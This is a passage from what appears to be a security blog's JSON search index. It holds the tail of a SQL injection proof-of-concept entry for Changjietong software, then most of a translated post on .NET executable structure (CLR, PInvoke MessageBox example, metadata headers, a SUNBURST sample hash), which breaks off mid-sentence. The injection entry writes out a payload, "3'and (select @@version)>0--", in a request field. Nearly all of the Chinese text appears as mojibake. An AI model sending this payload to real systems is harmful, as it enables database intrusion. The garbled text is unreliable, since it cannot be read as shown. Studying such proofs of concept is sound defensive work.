53&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;, &quot;dsName&quot;:&quot;&quot;&#125;","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"pocsuite","slug":"pocsuite","permalink":"https://hodlyounger.github.io/tags/pocsuite/"},{"name":"POC/SQLInject","slug":"POC-SQLInject","permalink":"https://hodlyounger.github.io/tags/POC-SQLInject/"},{"name":"SQLInject","slug":"SQLInject","permalink":"https://hodlyounger.github.io/tags/SQLInject/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"ç•…æ·é€š","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/ç•…æ·é€š","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"ã€.Netã€‘å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„åˆ†æï¼ˆç¿»è¯‘ï¼‰","date":"2024-03-19T03:26:50.783Z","path":"B_Code/CSharp/ã€.Netã€‘å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„åˆ†æ/","text":"æ¦‚è¿°ï¼š.Net å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„åˆ†æï¼ˆç¿»è¯‘ï¼‰ [toc] .NET æ¡†æ¶ .NET è½¯ä»¶å¼€å‘æ¡†æ¶å’Œç”Ÿæ€ç³»ç»Ÿæ˜¯ç”±å¾®è½¯åœ¨2002å¹´é¦–æ¬¡å‘å¸ƒã€‚æ—¨åœ¨æä¾›ä¸€ä¸ªå¯æ§çš„ç¼–ç¨‹ç¯å¢ƒå¹¶ä¸”å¯ä»¥åœ¨åŸºäºWindowsæ“ä½œç³»ç»Ÿä¸Šè¿›è¡Œå¼€å‘ã€å®‰è£…å’Œæ‰§è¡Œã€‚éšç€ .NET çš„å‘å±•ï¼Œ.NET5 ä¹‹åå¼€å§‹æ”¯æŒè·¨å¹³å°å¼€å‘ï¼Œå¹¶ä¸”æ”¯æŒå¤šè¯­è¨€ï¼ˆC#ã€VB.NETå’ŒF#ï¼‰ã€‚ .NET æ¡†æ¶åŒ…å«äº†ä¸€ä¸ªåä¸º Framenwork Class Libraryï¼ˆFCLï¼‰ çš„å¤§å‹ç±»åº“ï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†ä»æ•°æ®è®¿é—®åˆ°åŠ å¯†ä»¥åŠ XML è§£æç­‰ä¸€ç³»åˆ—çº¿ç¨‹å¯ç”¨ã€ç»è¿‡æµ‹è¯•å’Œä¼˜åŒ–çš„åŠŸèƒ½ã€‚ç”±äºå¹¿æ³›çš„æ”¯æŒå’Œæ‰˜ç®¡è¿è¡Œç¯å¢ƒä½¿å¾— .Net éœ€è¦æ›´å¤šäººå·¥å¹²é¢„çš„è¯­è¨€å’Œæ¡†æ¶ã€‚å°†ä»¥ä¸Šç‰¹æ€§ç»“åˆèµ·æ¥ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªåœ¨æ¡Œé¢ã€å‰ç«¯ã€ç§»åŠ¨è®¾å¤‡åˆ›å»ºä¸€äº›åˆ—åº”ç”¨ç¨‹åºçš„é«˜æ•ˆç¯å¢ƒã€‚ .NETå¨èƒç¯å¢ƒ ç›¸æ¯”äº C/C++ï¼Œç”±äº .NET ç”¨æˆ·å‹å¥½çš„å¼€å‘è¿‡ç¨‹ã€ä¸°å¯Œçš„åŠŸèƒ½é›†ã€ä»¥åŠå¹³æ»‘çš„ Windows é›†æˆï¼Œæ¶æ„è½¯ä»¶å¼€å‘äººå‘˜å¯èƒ½æ›´å–œæ¬¢ .NET æ¡†æ¶ã€‚ä½†æ˜¯ï¼Œåƒ dnSpy è¿™æ ·çš„å·¥å…·ä½¿å¾—é€†å‘æ¶æ„è½¯ä»¶å˜çš„å¾ˆç®€å•ï¼Œä¿ƒä½¿äº†åˆ›é€ è¿™äº›æ¶æ„è½¯ä»¶çš„äººä½¿ç”¨æ¨¡ç³Šæ–¹æ³•ï¼Œä½¿å¾—åˆ†ææ›´åŠ å›°éš¾ã€‚å¦å¤–ï¼Œ.NET çš„èƒ½åŠ›æ˜¯çš„æ¶æ„è½¯ä»¶æ”¹å˜å…¶è¡Œä¸ºæˆ–è€…éšè—ä½¿å…¶æ›´éš¾ä»¥æ£€æµ‹å’Œé€†å‘ã€‚è™½ç„¶ C/C++ å…è®¸å¯¹ç³»ç»Ÿèµ„æºè¿›è¡Œæ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œä»¥è‡³äºå…¶å¯èƒ½ä¼šå¯¼è‡´æ›´è°¨æ…å’Œæ›´é«˜æ•ˆçš„æ¶æ„è½¯ä»¶ï¼Œä½†æ˜¯è¿™éœ€è¦å¯¹ç³»ç»Ÿå†…éƒ¨å·¥ä½œåŸç†æœ‰æ›´æ·±å…¥åœ°äº†è§£ã€‚è¿™å°±ä½¿å¾— .NET æ›´åŠ æœ‰å¸å¼•åŠ›äº†ï¼Œå› ä¸ºè¿½æ±‚å¼€å‘é€Ÿåº¦å’Œæ˜“ç”¨æ€§çš„ .NET æ˜¯ä¸€ä¸ªæ›´æœ‰å¸å¼•åŠ›é€‰æ‹©ã€‚ .NET å¨èƒç¯å¢ƒæŒç»­æ¼”å˜ï¼Œæ”»å‡»è€…ç»å¸¸åˆ©ç”¨é€‚åº”æ€§å¼ºä¸”è¢«å¹¿æ³›é‡‡ç”¨çš„ .NET æ¡†æ¶æ¥ç²¾å¿ƒç¼–åˆ¶å’Œéƒ¨ç½²å„ç§å¤æ‚çš„å¨èƒã€‚è¿™ä¸ªæ¡†æ¶æ”¯æ’‘äº†è®¸å¤šç½‘ç»œæ”»å‡»ï¼Œæ¯”å¦‚è‡­åæ˜­è‘—çš„ Locky å’Œ Killnetã€‚å‡­æ®çªƒå–ç¨‹åºå’Œè‹±èˆªç‰¹æ´›ä¼Šæœ¨é©¬ç¨‹åºï¼ˆå¦‚CryptoClippyï¼‰åŒæ ·ä¹Ÿæ˜¯åŸºäº .NET çš„å¨èƒã€‚æ­¤å¤–ï¼Œç”¨ .NET ç¼–å†™çš„ç ´åæ€§ Wipers æ­£åœ¨ä¸æ–­å¢åŠ ã€‚DoubleZero ä»¥åŠæœ€è¿‘å‘ç°çš„ Hatef Wiper å°±æ˜¯è¿™ç§è¶‹åŠ¿çš„ä¾‹è¯ã€‚ æ­¤å¤–ï¼Œ.Net åœ¨åˆ›å»ºè¿œç¨‹è®¿é—®ç‰¹æ´›ä¼Šæœ¨é©¬ï¼ˆRATsï¼‰æ–¹é¢ä¹Ÿå‘æŒ¥äº†é‡è¦çš„ä½œç”¨ã€‚ä¾‹å¦‚ QuasarRAT å’Œ NanoCoreï¼Œå®ƒä»¬å› å…¶ä¸°å¯Œçš„åŠŸèƒ½é›†ä»¥åŠæ˜“äºä¿®æ”¹å’Œæ··æ·†è€Œåœ¨åœ°ä¸‹åœˆå­å¹¿å—èµèª‰ã€‚æ­¤å¤–ï¼Œ.NET æ˜¯åˆ›å»ºæ¶æ„è½¯ä»¶åŠ è½½å™¨çš„å¸¸ç”¨å·¥å…·ï¼Œè¿™äº›åŠ è½½å™¨å¯ä»¥è°¨æ…åœ°å®‰è£…å’Œæ‰§è¡Œå…¶ä»–ç±»å‹çš„æ¶æ„è½¯ä»¶ã€‚ .NET ç¼–è¯‘å’Œè¿è¡Œ ç¼–è¯‘ - æ‰˜ç®¡ä»£ç  æ‰˜ç®¡è¯­è¨€ï¼ˆC#ã€F#æˆ–VB.NETï¼‰ çš„æ‰§è¡Œç”±è¿è¡Œåº“æ§åˆ¶ã€‚å½“åˆé€‚çš„è¯­è¨€ç¼–è¯‘å™¨ç¼–è¯‘æºä»£ç æ—¶ï¼Œè¾“å‡ºä¸­é—´è¯­è¨€ï¼ˆIntermediate Languageï¼ŒILï¼‰ï¼Œä¹Ÿè¢«æˆä¸º MSIL(Microsoft Intermediate Language)ï¼Œæ‰˜ç®¡ä»£ç ï¼ˆManaged Codeï¼‰æˆ–è€…å…¬å…±ä¸­é—´è¯­è¨€ï¼ˆCommon Intermediate Languageï¼ŒCILï¼‰ã€‚ ä¸¾ä¾‹è¯´æ˜ï¼Œå½“åœ¨ .NET æ¡†æ¶ä¸‹ç¼–è¯‘ C# ä»£ç æ—¶ï¼ŒC# ç¼–è¯‘å™¨ï¼ˆcsc.exeï¼‰çš„è¾“å‡ºæ˜¯ä¸€ä¸ª .NET ç¨‹åºé›†ï¼Œè¯¥ç¨‹åºé›†å¯ä»¥æ˜¯ç‹¬ç«‹ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯é‡ç”¨åº“çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰ã€‚ è¿™ä¸ç¼–è¯‘éæ‰˜ç®¡è¯­è¨€ï¼ˆæ¯”å¦‚ C/C++ï¼‰ä¸åŒï¼Œåœ¨éæ‰˜ç®¡è¯­è¨€ä¸­ï¼Œæºä»£ç ç›´æ¥è½¬æ¢ä¸ºæœºå™¨ç ã€‚ç„¶åæ‰˜ç®¡ä»£ç æ‰“åŒ…åˆ°ä¸€ä¸ªç¨‹åºé›†ä¸­ï¼Œå¹¶é™„å¸¦ä¸€ä¸ªåŒ…å«æ‰€éœ€å…ƒæ•°æ®çš„æ¸…å•ã€‚ æ‰˜ç®¡ä»£ç çš„ä¼˜ç¾ä¹‹å¤„åœ¨äºå¯ç§»æ¤æ€§å’Œçµæ´»æ€§ï¼›åŒæ ·çš„ç¨‹åºé›†å¯ä»¥åœ¨ .NET æ”¯æŒçš„ä»»ä½•å¹³å°ä¸Šè¿è¡Œï¼Œè€Œæ— éœ€é‡æ–°ç¼–è¯‘ã€‚æ­¤å¤–ï¼Œæ‰˜ç®¡ä»£ç å…è®¸è·¨è¯­è¨€ç»§æ‰¿ä»£ç è®¿é—®å®‰å…¨æ€§ã€‚å®ƒæä¾›äº†åæœŸç»‘å®šæ”¯æŒçš„ä¼˜åŠ¿ï¼Œä»è€Œå¯ä»¥åœ¨è¿è¡Œæ—¶è¿›è¡Œè§£æå¹¶è°ƒç”¨å‡½æ•°ã€‚æ‰˜ç®¡ä»£ç å’Œç¨‹åºé›†ç»“æ„æä¾›çš„è¿™ç§çº§åˆ«çš„æŠ½è±¡æ˜¯ .NET æ¡†æ¶çš„å¤šåŠŸèƒ½è¡Œå’Œå¼ºå¤§åŠŸèƒ½çš„åŸºçŸ³ï¼Œä½¿å…¶å¼€å‘äººå‘˜èƒ½æ›´å®‰å…¨ã€æ›´æ˜“ç®¡ç†ã€æ›´é€‚æ—¶åœ°å»å¼€å‘åº”ç”¨ç¨‹åºã€‚ ä¸‹å›¾æ¼”ç¤ºäº† .NET ä¸­çš„ç¼–è¯‘å’Œæ‰§è¡Œè¿‡ç¨‹ï¼Œä»¥ C# ä½œä¸ºæ¼”ç¤ºï¼Œä½†é€‚åº”äºæ‰€æœ‰çš„ .NET è¯­è¨€ã€‚ è¿è¡Œæ—¶åº“ - é€šç”¨è¯­è¨€è¿è¡Œåº“(The Common Language Runtime,CLR) é€šç”¨è¿è¡Œæ—¶åº“æ˜¯ç®¡ç† .NET ç¨‹åºæ‰§è¡Œçš„å¾®è½¯ .NET æ¡†æ¶ä¸­çš„ä¸€ä¸ªé‡è¦ç»„ä»¶ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯æä¾›è¿è¡Œ .NET åº”ç”¨ç¨‹åºæ‰€éœ€çš„å„ç§æœåŠ¡çš„æ‰§è¡Œå¼•æ“ï¼Œè€Œä¸ç®¡è¿™äº›åº”ç”¨ç¨‹åºæ˜¯ç”¨ä»€ä¹ˆå˜æˆè¯­è¨€ç¼–å†™çš„ã€‚ å½“ä¸€ä¸ª .NET äºŒè¿›åˆ¶æ–‡ä»¶è¢«æ‰§è¡Œæ—¶ï¼Œ CLR å¼€å§‹è®¾ç½®æ‰§è¡Œç¯å¢ƒï¼Œä½†ä¸ä¼šç«‹é©¬å»æŠŠæ‰€æœ‰çš„æ‰˜ç®¡è¯­è¨€ç¿»è¯‘ä¸ºåŸå§‹çš„æœºå™¨ç ã€‚å®æ—¶ç¼–è¯‘ï¼ˆJust-In-Timeï¼‰ä¼šåœ¨è¢«è°ƒç”¨çš„æ—¶å€™å°†æ‰˜ç®¡ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚è¿™ç¡®ä¿äº†åœ¨ç‰¹å®šç¡¬ä»¶ä¸Šçš„é«˜æ•ˆæ‰§è¡Œã€‚æ­¤å¤–ï¼Œ.NET Core å’Œ .NET 5+ ä¸­çš„ NGEN å’Œ AOT ç¼–è¯‘æŠ€æœ¯å¯ä»¥åœ¨æ‰§è¡Œæ‰˜ç®¡ä»£ç å‰å°†å…¶é¢„ç¼–è¯‘ä¸ºæœ¬æœºä»£ç ï¼Œä»è€Œè¿›ä¸€æ­¥æé«˜äº†æ€§èƒ½ã€‚ CLR çš„åŠŸèƒ½è¶…å‡ºäº†åº”ç”¨ç¨‹åºçš„æ‰§è¡ŒèŒƒå›´ï¼›å®ƒæä¾›äº†è¯¸å¦‚å†…å­˜ç®¡ç†ã€å¼‚å¸¸å¤„ç†ã€åƒåœ¾å›æ”¶ã€ç±»å‹å®‰å…¨æ£€æŸ¥å’Œå®‰å…¨æ€§ç­‰å…³é”®æœåŠ¡ã€‚ç”± CLR åè°ƒçš„å†…å­˜ç®¡ç†æŠ½è±¡äº†å¼€å‘äººå‘˜æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾å†…å­˜çš„éœ€è¦ï¼Œæ˜¾è‘—å‡å°‘äº†å†…å­˜æ³„æ¼å’Œç›¸å…³é”™è¯¯ã€‚æä¾›è‡ªåŠ¨çš„åƒåœ¾å›æ”¶æ¥ç®¡ç†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸï¼Œé€šè¿‡é‡Šæ”¾åº”ç”¨ç¨‹åºä¸å†ä½¿ç”¨çš„å¯¹è±¡æ¥å›æ”¶å†…å­˜ã€‚ æ­¤å¤–ï¼ŒCLR å¼ºåˆ¶æ‰§è¡Œä¸¥æ ¼çš„ç±»å‹å®‰å…¨å¹¶ç¡®ä¿åº”ç”¨ç¨‹åºä¸ä¼šå°è¯•æ‰§è¡Œä¸å®‰å…¨æˆ–æœªç»éªŒè¯çš„æ“ä½œã€‚å®ƒåœ¨ .NET çš„å®‰å…¨ä½“ç³»ç»“æ„ä¸­ä¹Ÿå‘æŒ¥ç€é‡è¦ä½œç”¨ï¼Œæä¾›ä»£ç è®¿é—®å®‰å…¨æ€§ï¼ˆCode Access Security,CASï¼‰ï¼Œå…¶æ ¹æ®åˆ†é…ç»™åº”ç”¨ç¨‹åºçš„ä¿¡ä»»çº§åˆ«æ§åˆ¶ç¨‹åºå¯ä»¥è®¿é—®é‚£äº›èµ„æºã€‚æ€»ä½“æ¥è¯´ï¼ŒCLR åˆ›å»ºäº†ä¸€ä¸ªé«˜çº§åˆ«çš„ç¯å¢ƒï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘ä¼ ç»Ÿå˜æˆè¯­è¨€æ‰€éœ€çš„é¦™é†‹å¤šä½çº§ç¼–ç¨‹ä»»åŠ¡ï¼Œå®ç°äº†æ›´å¿«çš„å¼€å‘å‘¨æœŸã€æ›´é«˜çš„ç”Ÿäº§åŠ›å’Œæ›´å®‰å…¨å¯é çš„åº”ç”¨ç¨‹åºã€‚è¿™ä½¿å¾— CLR æˆä¸º .NET ç”Ÿæ€ç³»ç»Ÿä¸å¯æˆ–ç¼ºçš„ç»„ä»¶ã€‚ éæ‰˜ç®¡å‡½æ•° .NET æ¡†æ¶ä¸­çš„éæ‰˜ç®¡å‡½æ•°æ˜¯æŒ‡åœ¨ CLR çš„æ‰˜ç®¡ç¯å¢ƒä¹‹å¤–è¿è¡Œçš„ä»£ç ã€‚è¿™äº›å‡½æ•°é€šå¸¸ç”¨ C æˆ– C++ ç­‰è¯­è¨€ç¼–å†™ï¼Œå¹¶ç›´æ¥ç¼–è¯‘æˆæœºå™¨ç‰¹å®šçš„ä»£ç ï¼Œç»•è¿‡ CLR çš„ç®¡ç†ã€‚è¿™ä¹Ÿæ„å‘³ç€ä¸Šè¿°çš„ä¸€äº›ç‰¹å¾å¦‚å†…å­˜ç®¡ç†ã€åƒåœ¾å›æ”¶ç­‰åŠŸèƒ½æ˜¯æ‰˜ç®¡ç¯å¢ƒå›ºæœ‰çš„åŠŸèƒ½ä¸é€‚ç”¨äºè¿™äº›éæ‰˜ç®¡å‡½æ•°ã€‚å®ƒä»¬ä¸»è¦ç”¨äºäº’ç›¸æ“ä½œçš„ç›®çš„ï¼Œå…è®¸ .NET åº”ç”¨ç¨‹åºåˆ©ç”¨ä¸æ˜¯ä¸ .NET ç¨‹åºå…¼å®¹è¯­è¨€ç¼–å†™çš„é—ç•™ä»£ç æˆ–è€…å¤–éƒ¨åº“ã€‚å½“éœ€è¦ä½¿ç”¨ç°æœ‰çš„é .NET åº“æˆ–è€…è°ƒç”¨ç³»ç»Ÿçº§åˆ«çš„ API æ—¶ï¼Œåªèƒ½é€šè¿‡éæ‰˜ç®¡ä»£ç è®¿é—®ã€‚ ç„¶è€Œï¼Œè¿™å¸¦æ¥äº†é¢å¤–çš„å¤æ‚æ€§å’Œè´£ä»»ï¼Œå› ä¸ºå¼€å‘äººå‘˜å¿…é¡»æ‰‹åŠ¨å¤„ç†å†…å­˜æ³„æ¼å’Œé”™è¯¯å¤„ç†ï¼Œå¢åŠ äº†å†…å­˜æ³„æ¼å’Œå®‰å…¨æ¼æ´ç­‰é—®é¢˜çš„å¯èƒ½æ€§ã€‚åœ¨æ¶æ„è½¯ä»¶åˆ†æçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œäº†è§£éæ‰˜ç®¡å‡½æ•°è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä»¬å¯ç”¨äºæ‰§è¡Œç»•è¿‡æ‰˜ç®¡ç¯å¢ƒçš„æŸæ ¡ä¿æŠ¤æªæ–½çš„ä»£ç ï¼Œä»è€Œåœ¨åˆ†æå’Œæ£€æµ‹ä¸­å¸¦æ¥ä¸ä¸€èˆ¬çš„æŒ‘æˆ˜ã€‚ éæ‰˜ç®¡å‡½æ•°ç¤ºä¾‹ è¦åˆ›å»ºä½¿ç”¨éæ‰˜ç®¡ä»£ç åˆ›å»ºä¸€ä¸ªç®€å•çš„ .NET åº”ç”¨ç¨‹åºï¼Œå¯ä»¥ä½¿ç”¨ C# ä¸­çš„å¹³å°è°ƒç”¨æœåŠ¡ï¼ˆPlatform Invocation Services, PInvokeï¼‰ã€‚PInvoke å…è®¸æ‰˜ç®¡ä»£ç ä»åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰ä¸­è°ƒç”¨éæ‰˜ç®¡å‡½æ•°ã€‚ å¦‚ä¸‹æ‰€ç¤ºä¸ºï¼šä» user32.dll ä¸­è°ƒç”¨ MessageBox å‡½æ•°ï¼Œuser32.dll æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Windowsåº“ã€‚ 12345678910111213141516171819202122232425using System;using System.Runtime.InteropServices;class Program&#123; // Importing the MessageBox function from user32.dll [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Unicode)] public static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type); static void Main(string[] args) &#123; // Calling the MessageBox function - this is an unmanaged function call MessageBox(new IntPtr(0), &quot;Hello, World!&quot;, &quot;Message Box&quot;, 0); &#125;&#125; ç®€å•è¯´æ˜ä¸€ä¸‹ä¸Šè¿°ä»£ç ï¼š é¦–å…ˆä» user32.dll ä¸­ä½¿ç”¨ DllImport å±æ€§å¯¼å…¥ MessageBox å‡½æ•°ã€‚ è¿™ä¸€æ­¥éå¸¸å…³é”®ï¼Œä¸»è¦æ˜¯å‘Šè¯‰ CLR è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œè€Œé .NET è¿è¡Œæ—¶åº“å‡½æ•°ã€‚ MessageBox çš„å£°æ˜ä¸ user32.dll ä¸­çš„éæ‰˜ç®¡å‡½æ•°ä¸€è‡´ã€‚ åœ¨ Main å‡½æ•°ä¸­ï¼Œ è°ƒç”¨ MessageBox å‡½æ•°ï¼Œ å‚æ•°åŒ…æ‹¬ä¸€ä¸ªçª—å£å¥æŸ„ï¼ˆç¤ºä¾‹ä¼ é€’çš„ IntPtr(0)ï¼‰ã€ä¸€ä¸ªæ–‡æœ¬ï¼ˆHello, World!ï¼‰ã€ä¸€ä¸ªçª—å£æ ‡é¢˜ï¼ˆMessage Boxï¼‰ã€ä»¥åŠä¸€ä¸ªæ¶ˆæ¯æ¡†ç±»å‹å‚æ•° ï¼ˆ0ï¼Œ0 æŒ‡æœ€ç®€å•çš„åªæœ‰ä¸€ä¸ªç¡®è®¤æŒ‰é’®çš„çª—å£ï¼‰ã€‚ å½“ç¨‹åºè¢«è¿è¡Œï¼Œå°†åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸€ä¸ªçª—å£ã€‚ .NET ç¨‹åºé›† .NET ç¨‹åºé›†æ˜¯ .NET åº”ç”¨ç¨‹åºçš„åŸºæœ¬æ„æˆï¼Œç”¨ä½œä¸€ä¸ªæˆ–å¤šä¸ªä»£ç æ¨¡å—æˆ–èµ„æºæ–‡ä»¶çš„é›†åˆã€‚ç”Ÿæˆçš„ç¨‹åºé›†çš„å†…å®¹åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼š Intermediate Language, ILï¼šIL æ˜¯ä¸€ä¸ªä¸ CPU æ— å…³çš„æŒ‡ä»¤é›†ï¼Œå®ƒä½¿ç›¸åŒçš„ç¨‹åºé›†èƒ½å¤Ÿåœ¨ .NET æ¡†æ¶æ”¯æŒçš„ä¸åŒå¹³å°ä¸Šæ‰§è¡Œã€‚ Metadataï¼šå®ƒæè¿°äº†ç”± CLR ç®¡ç†çš„ç»“æ„å…ƒç´ ï¼Œå¦‚ç¨‹åºé›†ã€ç±»å‹ï¼ˆç±»ã€æ¥å£ã€æšä¸¾ã€ç»“æ„ä½“ï¼‰ï¼Œæ–¹æ³•ç­‰ç­‰ã€‚è¿™åŒ…æ‹¬è°ƒè¯•ã€åƒåœ¾å›æ”¶ã€å®‰å…¨å±æ€§æ‰€éœ€çš„ä¿¡æ¯ä»¥åŠè¿è¡Œåº“ç®¡ç†ä»£ç æ‰€éœ€çš„è¯¦ç»†ä¿¡æ¯ã€‚ Manifest: æ˜¯æè¿°ç¨‹åºé›†æœ¬èº«çš„å…ƒæ•°æ®çš„ç‰¹å®šéƒ¨åˆ†ã€‚å®ƒåŒ…æ‹¬ç¨‹åºé›†çš„åç§°ã€ç‰ˆæœ¬ã€åŒºåŸŸæ€§ï¼Œè¿˜å¯èƒ½åŒ…æ‹¬å”¯ä¸€æ ‡è¯†ç¨‹åºé›†çš„å¼ºåç§°ã€‚å…ƒæ•°æ®æè¿°ç¨‹åºé›†å†…çš„å†…ä»ï¼Œè€Œæ¸…å•æ–‡ä»¶æä¾›ç¨‹åºé›†æ•´ä½“çš„é«˜çº§åˆ«æ¦‚è¿°ï¼Œä»¥ç¡®ä¿ç¨‹åºé›†ä¸å…¶æ‰€ä¾èµ–çš„å…¶ä»–æ­£ç¡®ç‰ˆæœ¬çš„ç¨‹åºé›†äº¤äº’ã€‚ .NET å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼åˆ†æ åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œå°†å¯¹ .NET å†…å±‚è¿›ç¨‹åˆ†æã€‚ä½œè€…ä½¿ç”¨ä¸€ä¸ªç¤ºä¾‹ï¼ˆThe Notorious SubBurstï¼‰æ¥æ¼”ç¤ºæ‰€æ¶‰åŠåˆ°çš„æ¦‚å¿µï¼Œä»¥ä¾¿äºèƒ½ç†è§£ã€‚ ç¤ºä¾‹ï¼šMalicious SUNBURST b91ce2fa41029f6955bff20079468448 - Intezer æ–‡ä»¶hash: 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 ä½¿ç”¨åˆ°çš„å·¥å…·æœ‰ dnSpyã€ ILSpyã€ å’Œ PEStudio ã€‚(è¿™é‡Œå»ºè®®å¤§å®¶å®é™…æ“ä½œå»æ‰“å¼€ä¸€ä¸ª C# ç¼–è¯‘çš„ dll æŸ¥çœ‹ä¸€ä¸‹) ï¼ˆç”±äºèµ„æºä¸‹è½½çš„ç¼˜æ•…ï¼Œæˆ‘æ²¡æ³•æ‹¿åˆ°æ ·æœ¬è¿›è¡Œå±•ç¤ºï¼Œçœ‹çœ‹åŸä½œè€…çš„åˆ†æå†…å®¹å§ï¼‰ åœ¨ .NET ç¨‹åºé›†ä¸Šä¸‹æ–‡çš„è¿è¡Œæ—¶æ ‡å¤´æŒ‡å®šäº†ç”± CLR ä½¿ç”¨çš„ PE æ–‡ä»¶æ ¼å¼ä¸­çš„åŸºæœ¬å…ƒç´ ï¼ŒåŒ…å«äº† CLR æ­£ç¡®æ‰§è¡Œè¯¥ .NET ç¨‹åºé›†æ‰€éœ€çš„å…ƒæ•°æ®å’Œå…³é”®è¯¦ç»†ä¿¡æ¯ã€‚è¯¥è¿è¡Œæ—¶æ ‡å¤´æ˜¯ PE æ–‡ä»¶æ ‡å¤´ä¸­çš„ç¬¬ 15 ä¸ªæ•°æ®ç›®å½•æ¡ç›®ï¼Œä¹Ÿè¢«æˆä¸º CLR è¿è¡Œæ—¶æ ‡å¤´ï¼ˆCLR å¤´ï¼‰ã€‚ æ•°æ®ç›®å½•æ˜¯ PE æ–‡ä»¶ä¸­çš„ç´¢å¼•æˆ–ç›®å½•ï¼Œåˆ—å‡ºäº†é‡è¦éƒ¨åˆ†ï¼Œå¹¶æä¾›äº†å„ä¸ªéƒ¨åˆ†çš„ä½ç½®å’Œå¤§å°ï¼Œè¿™ä¸ªç»“æ„æä¾›å¯¹ PE æ–‡ä»¶ä¸åŒéƒ¨åˆ†çš„é«˜æ•ˆè®¿é—®ï¼Œä¾‹å¦‚å¯¼å…¥å’Œå¯¼å‡ºè¡¨ã€èµ„æºã€CLR è¿è¡Œæ—¶å¤´ç­‰ã€‚ å¦‚ä¸‹æ‰€ç¤ºæ¡ç›®æè¿°äº†è¿è¡Œæ—¶æ ‡å¤´çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€åŠå…¶å¤§å°ï¼Œä»è€Œå°† CLR å¼•å¯¼åˆ°æ­¤æ ‡å¤´æ¥ç®¡ç† .NET ç¨‹åºé›†åœ¨åŠ è½½æ—¶å¦‚ä½•æ‰§è¡Œã€‚ æˆªå›¾çš„ç¬¬15ä¸ªæ¡ç›®è¡¨æ˜¯ .NET çš„ç›¸å…³ä¿¡æ¯ã€‚ æ¥ä¸‹æ¥çš„éƒ¨åˆ†ï¼Œä½œè€…ä¸»è¦ä»‹ç»äº† PE ç»“æ„ã€å…ƒæ•°æ®å¤´åŠä¹‹å‰çš„å…³ç³»ã€‚ å…ƒæ•°æ®å¤´ç®¡ç†äº†æ–‡ä»¶å†…å®¹ã€‚å®ƒæä¾›äº†ä¸€ä¸ªåˆ†ç±»ç›®å½•æ¥åˆ—å‡ºæ¯ä¸€å—æ•°æ®çš„å¤§å°ã€ä»¥åŠåç§»é‡ã€‚å½“ CLR æˆ–è€…å¦‚ dnSpy æˆ–è€… ILDasm è¿™äº›å·¥å…·éœ€è¦è®¿é—®ä¸€æ®µå…ƒæ•°æ®çš„æ—¶å€™ï¼Œå®ƒä¼šæŸ¥è¯¢å…ƒæ•°æ®å¤´ä»¥æ‰¾åˆ°åˆé€‚çš„æ–‡ä»¶æµã€‚ç„¶åï¼Œå®ƒå¯¼èˆªåˆ°è¯¥æµä¸­çš„æ­£ç¡®ä½ç½®ä»¥è¯»å–æ•°æ®ã€‚ æ¥ä¸‹æ¥ï¼Œå°±æ˜¯åˆ†æè¯´æ˜ .NET å…ƒæ•°æ®å¤´ä¸­çš„å„ä¸ªå…³é”®å­—ã€‚ Signature: ç­¾åã€æ‰€æœ‰çš„ .NET å…ƒæ•°æ®å¤´ç­¾åéƒ½æ˜¯ BSJB (0x42534a42) GUIDï¼šé•¿åº¦ä¸º 128bits çš„å”¯ä¸€æ ‡è¯† IL-Onlyï¼šè¿™ä¸ªæ ‡å¿—æŒ‡æ˜ç¨‹åºé›†åªåŒ…å«ä¸­é—´è¯­è¨€ï¼ˆILï¼‰ä»£ç ï¼Œè€Œä¸åŒ…å«ç‰¹å®šäºCPUçš„æœ¬æœºä»£ç ã€‚PE å¯ä»¥åŒæ—¶åŒ…å«æ‰˜ç®¡ä»£ç å’Œéæ‰˜ç®¡ä»£ç ã€‚ 32-bit-required: è®¾ç½®è¿™ä¸ªæ 